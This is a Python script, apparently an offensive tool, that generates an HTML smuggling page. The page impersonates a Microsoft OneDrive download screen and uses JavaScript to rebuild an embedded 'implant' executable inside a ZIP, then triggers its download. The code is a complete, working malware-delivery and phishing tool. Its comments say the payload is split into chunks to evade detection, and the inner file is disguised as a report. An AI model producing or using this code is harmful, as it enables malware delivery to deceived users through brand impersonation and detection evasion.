"""
HTML Smuggling Generator

Takes a compiled implant and generates an HTML file that:
1. Displays a fake document download page
2. Reconstructs the exe from embedded base64 via JavaScript
3. Wraps it in a ZIP and triggers automatic download
"""

import base64
import struct
import os
import sys
import zlib
import time


def make_zip_bytes(filename, data):
    """Build a minimal ZIP archive in memory."""
    # Local file header
    crc = zlib.crc32(data) & 0xFFFFFFFF
    compressed = data  # STORED (no compression — less suspicious)
    fname_bytes = filename.encode("utf-8")
    mod_time = 0x4800  # 9:00
    mod_date = 0x5921  # 2024-12-01

    local_header = b"PK\x03\x04"
    local_header += struct.pack("<H", 20)           # version needed
    local_header += struct.pack("<H", 0)            # flags
    local_header += struct.pack("<H", 0)            # compression: STORED
    local_header += struct.pack("<H", mod_time)
    local_header += struct.pack("<H", mod_date)
    local_header += struct.pack("<I", crc)
    local_header += struct.pack("<I", len(compressed))
    local_header += struct.pack("<I", len(data))
    local_header += struct.pack("<H", len(fname_bytes))
    local_header += struct.pack("<H", 0)            # extra field len
    local_header += fname_bytes

    # Central directory
    central = b"PK\x01\x02"
    central += struct.pack("<H", 20)                # version made by
    central += struct.pack("<H", 20)                # version needed
    central += struct.pack("<H", 0)                 # flags
    central += struct.pack("<H", 0)                 # compression
    central += struct.pack("<H", mod_time)
    central += struct.pack("<H", mod_date)
    central += struct.pack("<I", crc)
    central += struct.pack("<I", len(compressed))
    central += struct.pack("<I", len(data))
    central += struct.pack("<H", len(fname_bytes))
    central += struct.pack("<H", 0)                 # extra len
    central += struct.pack("<H", 0)                 # comment len
    central += struct.pack("<H", 0)                 # disk start
    central += struct.pack("<H", 0)                 # internal attr
    central += struct.pack("<I", 0x20)              # external attr (archive)
    central += struct.pack("<I", 0)                 # offset to local header
    central += fname_bytes

    # End of central directory
    cd_offset = len(local_header) + len(compressed)
    cd_size = len(central)

    eocd = b"PK\x05\x06"
    eocd += struct.pack("<H", 0)                    # disk number
    eocd += struct.pack("<H", 0)                    # disk with CD
    eocd += struct.pack("<H", 1)                    # entries on disk
    eocd += struct.pack("<H", 1)                    # total entries
    eocd += struct.pack("<I", cd_size)
    eocd += struct.pack("<I", cd_offset)
    eocd += struct.pack("<H", 0)                    # comment len

    return local_header + compressed + central + eocd


def generate_smuggle_html(implant_path, output_html, download_name="Document.zip",
                          inner_name="Report_2024.exe", page_title="OneDrive",
                          page_message="Your document is ready for download."):
    """
    Generate HTML smuggling page.

    implant_path:  path to compiled implant.exe
    output_html:   output .html file
    download_name: filename the browser will save as
    inner_name:    filename inside the zip
    page_title:    page title shown in browser tab
    page_message:  message shown to the user
    """
    with open(implant_path, "rb") as f:
        implant_data = f.read()

    # Build ZIP in memory
    zip_bytes = make_zip_bytes(inner_name, implant_data)

    # Base64 encode — split into chunks to avoid detection
    b64 = base64.b64encode(zip_bytes).decode("ascii")

    # Split base64 into array of chunks (evades simple string matching)
    chunk_size = 1024
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
    chunks_js = ",\n".join([f'"{c}"' for c in chunks])

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title} - Document Ready</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .container {{
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 480px;
            text-align: center;
        }}
        .logo {{
            width: 44px;
            height: 44px;
            margin: 0 auto 20px;
        }}
        .logo svg {{ width: 100%; height: 100%; }}
        h1 {{
            font-size: 20px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 8px;
        }}
        p {{
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.5;
        }}
        .btn {{
            display: inline-block;
            background: #0078d4;
            color: white;
            padding: 10px 32px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 14px;
            cursor: pointer;
            border: none;
            transition: background 0.2s;
        }}
        .btn:hover {{ background: #106ebe; }}
        .spinner {{
            display: none;
            margin: 20px auto 0;
            width: 24px;
            height: 24px;
            border: 3px solid #ddd;
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .done {{
            display: none;
            color: #107c10;
            font-size: 14px;
            margin-top: 16px;
        }}
        .footer {{
            margin-top: 30px;
            color: #999;
            font-size: 11px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="20" height="20" fill="#0364B8"/>
                <rect x="22" y="0" width="20" height="20" fill="#0078D4"/>
                <rect x="0" y="22" width="20" height="20" fill="#1490DF"/>
                <rect x="22" y="22" width="20" height="20" fill="#28A8EA"/>
            </svg>
        </div>
        <h1>{page_title}</h1>
        <p>{page_message}</p>
        <button class="btn" id="dlBtn" onclick="startDownload()">Download Document</button>
        <div class="spinner" id="spinner"></div>
        <div class="done" id="done">Download started. Check your downloads folder.</div>
        <div class="footer">Microsoft Corporation. All rights reserved.</div>
    </div>

    <script>
    function startDownload() {{
        document.getElementById('dlBtn').style.display = 'none';
        document.getElementById('spinner').style.display = 'block';

        setTimeout(function() {{
            var p = [
                {chunks_js}
            ];
            var d = atob(p.join(''));
            var b = new Uint8Array(d.length);
            for (var i = 0; i < d.length; i++) {{
                b[i] = d.charCodeAt(i);
            }}
            var bl = new Blob([b], {{type: 'application/zip'}});
            var a = document.createElement('a');
            a.href = URL.createObjectURL(bl);
            a.download = '{download_name}';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(a.href);

            document.getElementById('spinner').style.display = 'none';
            document.getElementById('done').style.display = 'block';
        }}, 1500);
    }}
    </script>
</body>
</html>"""

    with open(output_html, "w", encoding="utf-8") as f:
        f.write(html)

    return os.path.getsize(output_html)


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <implant.exe> <output.html> [download_name] [inner_name]")
        sys.exit(1)

    implant = sys.argv[1]
    output = sys.argv[2]
    dl_name = sys.argv[3] if len(sys.argv) > 3 else "Document.zip"
    inner = sys.argv[4] if len(sys.argv) > 4 else "Report_2024.exe"

    size = generate_smuggle_html(implant, output, dl_name, inner)
    print(f"HTML smuggling page generated: {output} ({size/1024:.1f} KB)")
